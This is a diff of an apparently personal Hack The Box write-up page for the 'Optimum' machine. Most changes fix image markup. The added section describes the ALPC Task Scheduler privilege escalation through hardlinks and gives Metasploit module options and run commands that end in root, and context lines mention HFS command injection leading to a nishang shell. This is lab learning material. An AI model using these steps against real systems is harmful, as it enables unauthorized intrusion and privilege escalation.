@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-03-13T22:41:59 EDT">
+<meta name="revised" content="2019-03-13T23:55:54 EDT">
 <title>Optimum :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -534,9 +534,9 @@ Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds
 
 <p>hfs is vulnerable to a cmd injection vuln. That will allow us to Invoke a nishang shell</p>
 
-<p>![hfs](](<a href="https://chickenpwny.github.io/images/optimium/hfs.PNG">https://chickenpwny.github.io/images/optimium/hfs.PNG</a>)</p>
+<p><img src="https://chickenpwny.github.io/images/optimium/hfs.PNG" alt="hfs" /></p>
 
-<p>![powershell-Invoker](](<a href="https://chickenpwny.github.io/images/optimium/powershell-Invoker.PNG">https://chickenpwny.github.io/images/optimium/powershell-Invoker.PNG</a>)</p>
+<p><img src="https://chickenpwny.github.io/images/optimium/powershell-Invoker.PNG" alt="powershell-Invoker" /></p>
 
 <p>SEARCHSPLOIT</p>
 
@@ -579,7 +579,7 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0
 dir /A:D
 </code></pre>
 
-<p>![framework-net](](<a href="https://chickenpwny.github.io/images/optimium/framework-net.PNG">https://chickenpwny.github.io/images/optimium/framework-net.PNG</a>)</p>
+<p><img src="https://chickenpwny.github.io/images/optimium/framework-net.PNG" alt="framework-net" /></p>
 
 <p>i will compile it in 4.0 .net. 0xdf has a great guide for compiling watson &amp; ippsec has a video on it.</p>
 
@@ -740,6 +740,40 @@ Exploit target:
 </code></pre>
 
 <p>Then it hangs.</p>
+
+<p>ALPX task scheduler local privilege elevation</p>
+
+<p>writes arbitrary dacls to ,job files located in c:windows\task. This is pretty bad lol it doesn&rsquo;t check for an impersonation attack. since we can create files in c:\windows\task folder a hardlink can be created to a file the user has read access to. after creating a hardlink, the vulnerability can triggered to set the dacls ton the linked file. teste dup windows10</p>
+
+<pre><code>msf5 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/alpc_taskscheduler
+msf5 exploit(windows/local/alpc_taskscheduler) &gt; options
+
+Module options (exploit/windows/local/alpc_taskscheduler):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   PROCESS                   no        Name of process to spawn and inject dll into.
+   SESSION                   yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 10 x64
+</code></pre>
+
+<p>need to set the lhost, lport,  &amp; session.</p>
+
+<pre><code>set session 2
+set lhost ippaddr
+set lport 443
+run
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/optimum/root.PNG" alt="root" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/optimum/optimum/502.jpg" alt="502" /></p>
 
 
     
